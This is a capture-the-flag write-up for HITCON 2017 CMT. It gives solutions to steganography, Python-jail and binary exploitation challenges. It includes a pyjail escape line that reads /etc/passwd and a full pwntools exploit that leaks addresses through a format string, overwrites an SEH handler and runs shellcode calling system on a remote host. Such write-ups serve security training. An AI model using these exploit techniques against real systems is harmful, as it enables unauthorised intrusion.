# HITCON 2017 CMT Writeup

## MISC
### Hello world
`HITCON{Hack the planet !}`
### Stegofun4u

- decode.py

```
#!/usr/bin/python
from PIL import Image
data = ""
im = Image.open("./en.png")
pix = im.load()
width, height = im.size
encode_image = Image.new("RGB",(width,height))
newpix = encode_image.load()
x,y = (0,0)

count = 0
for i in range(x,width,1):
        for j in range(y,height,1):
                data += str((pix[i,j][0] & 0x2) >> 1) + str(pix[i,j][1] & 0x1) + str((pix[i,j][2] & 0x4) >> 2)

data_raw =  ''.join(chr(int(data[i*8:i*8+8],2)) for i in range(len(data)//8))
f = open("solve.jpg","w")
f.write(data_raw)
```
Then you will get the picture.
![](solve.jpg)

The picture is a little corruption, you need to fixed it.
That is, the end of jpg is 0xffd9.

After fixed it, use outguess and the key `sh3llw3pl4yth3g4m4` to extract the flag.

### Pyjail
Use the warnings message
`sys.modules['_warnings'].warn_explicit("default",UserWarning,"/etc/passwd",1)`

## Pwnable

### Power Station
It's a little captcha challenge and it has a integer overflow vulnerability in time out function

```
void sig_alarm_handler(int signum){
    unsigned int choice ;
    puts("Power failure");
    printf("Do you want to continue ? (1:yes 2:no)");
    choice = read_int();
    if(choice == 1){
        puts("You lost a little power");
        power -= 50;
        return;
    }else{
        exit(1);
    }
}
```
You can let the power less than 50 and wait until time out, you would get a very large power.

You can let power equal to 2000 and buy Nuclear reactor and Solar cell panel than your power will less than 50.


### Imagic
- Vulnerability 
	- Out of bound and buffer overflow in save image.
	- Format string

- Protection
	- Stack cookie 
	- No DEP
	- NO SEHOP,SafeSeh 

- Exploit
	- First connection 
		- Use format string vulnerability to leak code base 
	- Second connection 
		- Overwrite the SEH Handler
		- Trigger the SEH and jmp to shellcode

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "54.199.221.215"
port = 50216
r = remote(host,port)
r.recvuntil(":")
r.sendline("#%p#")
r.recvuntil(":")
r.sendline("3")
r.recvuntil("#")
codeaddr = int(r.recvuntil("#")[:-1],16)
r.close()
r = remote(host,port)
codebase = codeaddr-0x19610
sc = asm("pop eax;pop eax;pop eax;sub eax,0x40;jmp eax",arch="i386")
name = "%s%s%s%s" + sc
nameaddr = codebase + 0x1c2ac
ret = codebase + 0x1281
system = codebase + 0x1260
scaddr = codebase+0x1c2b4
cmd = codebase + 0x14ab4
main = codebase+0x10e0
r.recvuntil(":")
r.send(name)


def save(size,data):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(data)

save(255,"a"*254)
save(255,"b"*254)
save(255,"c"*254)
save(255,"d"*254)
sc = asm("push 0x%x;mov eax,0x%x;jmp eax" % (cmd,system),arch="i386")
payload = "\x90"*0x30 + sc
save(255,payload.ljust(0x60,"\x90") + p32(scaddr))
r.recvuntil(":")
r.sendline("3")
r.interactive()
```
